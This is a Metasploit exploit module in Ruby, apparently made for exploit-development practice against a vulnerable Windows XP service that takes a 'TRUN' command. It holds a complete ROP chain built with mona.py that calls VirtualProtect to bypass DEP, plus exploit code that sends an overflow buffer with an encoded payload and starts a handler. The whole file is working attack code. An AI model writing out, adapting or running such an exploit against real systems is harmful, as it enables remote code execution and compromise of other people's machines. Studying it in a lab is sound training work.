require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'DEP Bypass Exploit',
      'Description'    => %q{
        		  DEP Bypass Using ROP Chains Example Module
      			  },
      'Platform'       => 'Windows',
      'Author'         => 'yxz',
      'Payload'        =>
        		  {
          		  'space'     => 312,
          		  'BadChars'  => "\x00"
        		  },
      'Targets'        =>
      		  	  [
          		    [
			    'Windows XP',
			    {'Offset'  => 2006}
			    ]
        		  ],
      'DisclosureDate' => '2020-02-26'))
  end

  def create_rop_chain()
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x77f01564,  # POP EAX # RETN [GDI32.dll] 
      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
      0x77e62d1c,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [RPCRT4.dll] 
      0x7c96d192,  # XCHG EAX,ESI # RETN [ntdll.dll] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x77bef857,  # POP EBP # RETN [msvcrt.dll] 
      0x625011af,  # & jmp esp [essfunc.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x77c2289b,  # POP EAX # RETN [msvcrt.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x77eba3d7,  # NEG EAX # RETN [RPCRT4.dll] 
      0x7c9259c8,  # XCHG EAX,EBX # RETN [ntdll.dll] 
      #[---INFO:gadgets_to_set_edx:---]
      0x77e96d43,  # POP EAX # RETN [RPCRT4.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x719ec15c,  # NEG EAX # RETN [mswsock.dll] 
      0x7c8409d4,  # XCHG EAX,EDX # RETN [kernel32.dll] 
      #[---INFO:gadgets_to_set_ecx:---]
      0x77c10e6f,  # POP ECX # RETN [msvcrt.dll] 
      0x7c99e2fb,  # &Writable location [ntdll.dll]
      #[---INFO:gadgets_to_set_edi:---]
      0x77bfa88c,  # POP EDI # RETN [msvcrt.dll] 
      0x77e6d224,  # RETN (ROP NOP) [RPCRT4.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x77e8c50c,  # POP EAX # RETN [RPCRT4.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x77e03da2,  # PUSHAD # RETN [ADVAPI32.dll] 
    ].flatten.pack("V*")

    return rop_gadgets
  end

  def exploit
    connect
    rop_chain = create_rop_chain()
    junk = make_nops(target['Offset'])
    buf = "TRUN ." + junk + rop_chain + make_nops(16) + payload.encoded + '\r\n'
    sock.put(buf)
    handler
    disconnect
  end
end
